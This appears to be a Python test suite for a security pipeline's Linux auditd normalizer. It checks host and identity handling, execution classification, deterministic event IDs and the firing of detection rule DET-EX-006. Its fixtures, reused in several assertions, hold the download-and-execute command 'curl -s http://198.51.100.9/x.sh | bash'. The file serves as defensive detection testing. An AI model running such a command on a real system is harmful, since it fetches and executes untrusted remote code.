"""D2 / D3 / D10 · auditd correctness acceptance.

Verified defect definitions this suite holds the code to (from the defect
register in `memory/REAL_SECURITY_LOOP_STEP1_OWNER_ANSWER.md`):

  D2  the normalizer lost host AND user identity: `host = {hostname: "",
      host_id: ""}` even though the envelope carried a source, and
      `identity.username = "uid:"` with `is_privileged = False`.
  D3  `record_type=EXECVE` was classified `event_type="auditd_syscall"`
      instead of `process_execution`, because the branch required
      `syscall` or `exe` — neither of which an EXECVE record carries.
  D10 `event_id = uuid4()`, so replaying the identical line produced a
      different canonical id every time.

EVIDENCE LABELLING
  REPLAYED REAL EVIDENCE — `REAL_EXECVE` below is the verbatim auditd line
  already present in stored canonical evidence from the acceptance run.
  TEST/SYNTHETIC — the SYSCALL/PROCTITLE/NODE variants, which are the
  records auditd genuinely emits alongside it, constructed here.
  Neither is live telemetry and neither is sent to production.
"""
from __future__ import annotations

from detection_content.library import REGISTRY
from detection_content.telemetry.auditd_stitcher import plan_stitch
from detection_content.telemetry.linux_auditd_dsm import LinuxAuditdDSM

DSM = LinuxAuditdDSM()
AUD = "1757452888.555:9002"

# REPLAYED REAL EVIDENCE (verbatim, from stored canonical evidence)
REAL_EXECVE = (f'type=EXECVE msg=audit({AUD}): argc=3 a0="/bin/bash" '
               f'a1="-c" a2="curl -s http://198.51.100.9/x.sh | bash"')
# TEST/SYNTHETIC companions
SYSCALL = (f'type=SYSCALL msg=audit({AUD}): arch=c000003e syscall=59 '
           f'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=0 euid=0 '
           f'comm="bash" exe="/usr/bin/bash" key="exec"')
SYSCALL_NODE = SYSCALL.replace("type=SYSCALL",
                               'node=web-prod-04 type=SYSCALL')
PROCTITLE = (f'type=PROCTITLE msg=audit({AUD}): '
             f'proctitle=2F62696E2F62617368002D63')


def norm(line, tenant="t-corr", collector="col-1", source=None):
    """Unstitched path: one record, straight through."""
    raw = {"tenant_id": tenant, "line": line, "message": line,
           "collector_id": collector}
    if source is not None:
        raw["source"] = source
    parsed = DSM.select_parser().parse(raw)
    return DSM.select_normalizer().normalize(
        parsed, DSM.id, collector, "int-1", "trace-1", tenant_id=tenant)


def stitch(lines, tenant="t-corr", collector="col-1", source=None):
    """Stitched path: a planned group, through the same normalizer."""
    p = plan_stitch(lines, [tenant] * len(lines), [collector] * len(lines))
    st = list(p["stitched"].values())[0]
    raw = {**st, "tenant_id": tenant, "line": st["_primary_line"],
           "message": st["_primary_line"], "collector_id": collector}
    if source is not None:
        raw["source"] = source
    parsed = DSM.select_parser().parse(raw)
    return DSM.select_normalizer().normalize(
        parsed, DSM.id, collector, "int-1", "trace-1", tenant_id=tenant)


def add(c):
    return c["additional_fields"]


# ── 1 · stitched event WITH hostname observed ─────────────────────────
def test_stitched_with_node_uses_the_audit_records_own_host_name():
    c = stitch([SYSCALL_NODE, REAL_EXECVE, PROCTITLE], source="collector-box")
    assert c["host"]["hostname"] == "web-prod-04"
    assert c["host"]["host_id"] == "web-prod-04"
    # auditd's own naming outranks the collector's label — the collector
    # hostname must never stand in for the endpoint's.
    assert add(c)["host_identity_source"] == "auditd:node"
    assert add(c)["host_identity_state"] == "OBSERVED"


def test_stitched_with_only_an_envelope_source_records_that_provenance():
    c = stitch([SYSCALL, REAL_EXECVE], source="prod-host-7")
    assert c["host"]["hostname"] == "prod-host-7"
    assert add(c)["host_identity_source"] == "collector:envelope.source"


# ── 2 · stitched event WITHOUT hostname ───────────────────────────────
def test_stitched_without_any_host_evidence_stays_not_observed():
    c = stitch([SYSCALL, REAL_EXECVE])
    assert c["host"]["hostname"] == ""
    assert c["host"]["host_id"] == ""
    assert add(c)["host_identity_state"] == "NOT_OBSERVED"
    assert add(c)["host_identity_source"] is None
    assert "fabricated claim" in add(c)["host_not_observed_reason"]


# ── 3 · unstitched / partial WITH hostname ────────────────────────────
def test_unstitched_execve_with_source_resolves_host_and_is_an_execution():
    c = norm(REAL_EXECVE, source="prod-host-7")
    assert c["host"]["hostname"] == "prod-host-7"          # D2
    assert c["event_type"] == "process_execution"          # D3
    assert c["event_id"].startswith("cev_auditd_")         # D10
    assert "curl" in c["process"]["command_line"]


def test_unstitched_syscall_with_node_resolves_host():
    c = norm(SYSCALL_NODE)
    assert c["host"]["hostname"] == "web-prod-04"
    assert add(c)["host_identity_source"] == "auditd:node"
    assert c["identity"]["is_privileged"] is True
    assert add(c)["identity_state"] == "OBSERVED"


# ── 4 · unstitched / partial WITHOUT hostname ─────────────────────────
def test_unstitched_without_host_or_identity_is_honest_on_both():
    c = norm(REAL_EXECVE)
    assert c["host"]["hostname"] == ""
    assert add(c)["host_identity_state"] == "NOT_OBSERVED"
    # D2 · the old lie: username "uid:" and is_privileged False on no
    # evidence whatsoever.
    assert c["identity"]["username"] == ""
    assert c["identity"]["username"] != "uid:"
    assert add(c)["identity_state"] == "NOT_OBSERVED"
    assert "privilege is unknown, not unprivileged" in \
        add(c)["identity_not_observed_reason"]
    # ...and it is still correctly an execution with the real command line.
    assert c["event_type"] == "process_execution"
    assert "curl -s http://198.51.100.9/x.sh | bash" in \
        c["process"]["command_line"]


# ── 5 · two tenants, identical audit identifiers ──────────────────────
def test_two_tenants_with_identical_audit_ids_never_collide():
    a = norm(SYSCALL, tenant="tenant-a")
    b = norm(SYSCALL, tenant="tenant-b")
    assert a["event_id"] != b["event_id"]
    assert a["tenant_id"] == "tenant-a" and b["tenant_id"] == "tenant-b"

    sa = stitch([SYSCALL, REAL_EXECVE], tenant="tenant-a")
    sb = stitch([SYSCALL, REAL_EXECVE], tenant="tenant-b")
    assert sa["event_id"] != sb["event_id"]


# ── 6 · two collectors, same audit serial ─────────────────────────────
def test_two_collectors_with_the_same_serial_never_collide():
    a = norm(SYSCALL, collector="col-a")
    b = norm(SYSCALL, collector="col-b")
    assert a["event_id"] != b["event_id"]

    sa = stitch([SYSCALL, REAL_EXECVE], collector="col-a")
    sb = stitch([SYSCALL, REAL_EXECVE], collector="col-b")
    assert sa["event_id"] != sb["event_id"]


# ── 7 · duplicate raw records ─────────────────────────────────────────
def test_duplicate_records_do_not_change_the_canonical_identity():
    once = stitch([SYSCALL, REAL_EXECVE])
    twice = stitch([SYSCALL, REAL_EXECVE, REAL_EXECVE])
    assert once["event_id"] == twice["event_id"], \
        "a duplicated delivery must not become a different event"
    assert len(twice["evidence_refs"]) == 3, "the duplicate is still kept"


# ── 8 · replay of the same logical evidence ───────────────────────────
def test_replay_is_idempotent_on_both_paths():
    assert norm(REAL_EXECVE)["event_id"] == norm(REAL_EXECVE)["event_id"]
    assert stitch([SYSCALL, REAL_EXECVE])["event_id"] == \
        stitch([SYSCALL, REAL_EXECVE])["event_id"]


def test_distinct_records_of_the_same_audit_event_do_not_collapse():
    """A lone SYSCALL and a lone EXECVE share an audit id but are NOT the
    same evidence, so they must not become one canonical event."""
    assert norm(SYSCALL)["event_id"] != norm(REAL_EXECVE)["event_id"]
    assert add(norm(SYSCALL))["event_id_basis"] == \
        "tenant+collector+audit_identity+record_type"
    assert add(stitch([SYSCALL, REAL_EXECVE]))["event_id_basis"] == \
        "tenant+collector+audit_identity"


def test_different_audit_events_never_share_an_identity():
    other = SYSCALL.replace(":9002", ":9003")
    assert norm(SYSCALL)["event_id"] != norm(other)["event_id"]


def test_a_record_without_an_audit_id_is_still_deterministic():
    line = 'type=SYSCALL syscall=59 uid=0 exe="/usr/bin/bash" comm="bash"'
    a, b = norm(line), norm(line)
    assert a["event_id"] == b["event_id"]
    assert add(a)["event_id_basis"] == "tenant+collector+verbatim_line"
    # A different line must not reuse that identity.
    assert norm(line.replace("uid=0", "uid=1000"))["event_id"] != a["event_id"]


# ── 9 · malformed host identity ───────────────────────────────────────
def test_placeholder_host_values_are_refused_not_recorded_as_evidence():
    for junk in ("localhost", "LOCALHOST", "127.0.0.1", "::1", "unknown",
                 "default", "-", "none", "null", "   "):
        c = norm(SYSCALL, source=junk)
        assert c["host"]["hostname"] == "", f"{junk!r} was accepted as a host"
        assert add(c)["host_identity_state"] == "NOT_OBSERVED"


def test_a_real_node_value_still_wins_over_a_placeholder_source():
    c = norm(SYSCALL_NODE, source="localhost")
    assert c["host"]["hostname"] == "web-prod-04"
    assert add(c)["host_identity_source"] == "auditd:node"


def test_tenant_name_is_never_used_as_a_hostname():
    c = norm(SYSCALL, tenant="acme-corp")
    assert c["host"]["hostname"] == ""
    assert "acme-corp" not in str(c["host"])


# ── 10 · D8 citation after the correctness changes ────────────────────
def test_d8_citation_still_works_and_is_evidence_derived():
    c = stitch([SYSCALL_NODE, REAL_EXECVE, PROCTITLE], source="collector-box")
    matches = REGISTRY.evaluate_event(c)
    ids = [m["rule_id"] for m in matches]
    assert "DET-EX-006" in ids, ids
    cit = next(m for m in matches if m["rule_id"] == "DET-EX-006")["citation"]
    assert cit["citation_completeness"] == "CITED"
    for cond in cit["matched_conditions"]:
        assert cond["result"] == "MATCH"
        assert "curl -s http://198.51.100.9/x.sh | bash" in \
            cond["observed_value"]
        assert cond["evidence_ref"].endswith(c["event_id"])


def test_no_match_remains_evidence_derived_after_the_changes():
    benign = (f'type=EXECVE msg=audit({AUD}): argc=2 a0="/usr/bin/curl" '
              f'a1="-O http://example.com/archive.tar.gz"')
    c = stitch([SYSCALL, benign])
    ids = [m["rule_id"] for m in REGISTRY.evaluate_event(c)]
    assert "DET-EX-006" not in ids, \
        "a download with no pipe to a shell must not match"


# ── 11 · raw evidence drill-down ──────────────────────────────────────
def test_drill_down_to_the_original_record_survives():
    c = stitch([SYSCALL_NODE, REAL_EXECVE, PROCTITLE])
    execve = next(r for r in c["evidence_refs"]
                  if r["record_type"] == "EXECVE")
    assert execve["line"] == REAL_EXECVE
    assert add(c)["stitch_canonical_attribution"]["process.argv"] == "EXECVE"
    assert add(c)["stitch_canonical_attribution"]["identity"] == "SYSCALL"
    assert add(c)["command_line_source_record"] == "EXECVE"


# ── 12 · regression against D4 behaviour ──────────────────────────────
def test_d4_stitching_behaviour_is_unchanged():
    c = stitch([SYSCALL, REAL_EXECVE, PROCTITLE])
    # identity AND the real command line still true of the same event
    assert c["identity"]["is_privileged"] is True
    assert "curl -s http://198.51.100.9/x.sh | bash" in \
        c["process"]["command_line"]
    assert c["process"]["pid"] == 5678 and c["process"]["ppid"] == 1234
    assert add(c)["stitch_completeness"] == "COMPLETE"
    assert len(c["evidence_refs"]) == 3
    assert c["event_type"] == "process_execution"


def test_partial_group_still_reports_partial():
    c = stitch([REAL_EXECVE, PROCTITLE])
    assert add(c)["stitch_completeness"] == "PARTIAL"
    assert add(c)["stitch_missing_records"] == ["SYSCALL"]
    assert add(c)["identity_state"] == "NOT_OBSERVED"


def test_out_of_order_still_yields_an_identical_event():
    a = stitch([SYSCALL, REAL_EXECVE, PROCTITLE])
    b = stitch([PROCTITLE, REAL_EXECVE, SYSCALL])
    assert a["event_id"] == b["event_id"]
    assert a["process"] == b["process"] and a["identity"] == b["identity"]
    assert a["host"] == b["host"]
